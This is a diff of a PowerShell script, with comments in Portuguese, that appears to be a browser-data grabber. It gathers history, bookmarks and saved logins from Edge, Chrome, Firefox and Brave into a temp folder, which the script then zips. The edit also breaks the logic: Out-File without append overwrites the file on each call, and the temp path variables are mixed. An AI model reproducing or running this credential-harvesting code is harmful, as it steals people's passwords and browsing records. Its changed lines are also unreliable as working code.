@@ -513,21 +513,18 @@ function Get-BrowserData {
     } 
 }
 
-Get-BrowserData -Browser "edge" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
+# Criar uma pasta para os dados do navegador
+New-Item -ItemType Directory -Path "$env:TEMP\$FolderName\depois_muda_se" | Out-Null
 
-Get-BrowserData -Browser "edge" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
-
-Get-BrowserData -Browser "chrome" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
-
-Get-BrowserData -Browser "chrome" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
-
-Get-BrowserData -Browser "firefox" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
-
-Get-BrowserData -Browser "firefox" -DataType "logins" >> $env:TMP\$FolderName\BrowserData.txt
-
-Get-BrowserData -Browser "brave" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
-
-Get-BrowserData -Browser "brave" -DataType "logins" >> $env:TMP\$FolderName\BrowserData.txt
+# Salvar os dados do navegador dentro da nova pasta
+Get-BrowserData -Browser "edge" -DataType "history" | Out-File "$env:TMP\$FolderName\depois_muda_se\BrowserData.txt"
+Get-BrowserData -Browser "edge" -DataType "bookmarks" | Out-File "$env:TMP\$FolderName\depois_muda_se\BrowserData.txt"
+Get-BrowserData -Browser "chrome" -DataType "history" | Out-File "$env:TMP\$FolderName\depois_muda_se\BrowserData.txt"
+Get-BrowserData -Browser "chrome" -DataType "bookmarks" | Out-File "$env:TMP\$FolderName\depois_muda_se\BrowserData.txt"
+Get-BrowserData -Browser "firefox" -DataType "history" | Out-File "$env:TMP\$FolderName\depois_muda_se\BrowserData.txt"
+Get-BrowserData -Browser "firefox" -DataType "logins" | Out-File "$env:TMP\$FolderName\depois_muda_se\BrowserData.txt"
+Get-BrowserData -Browser "brave" -DataType "history" | Out-File "$env:TMP\$FolderName\depois_muda_se\BrowserData.txt"
+Get-BrowserData -Browser "brave" -DataType "logins" | Out-File "$env:TMP\$FolderName\depois_muda_se\BrowserData.txt"
 ############################################################################################################################################################
 
 Compress-Archive -Path $env:tmp/$FolderName -DestinationPath $env:tmp/$ZIP
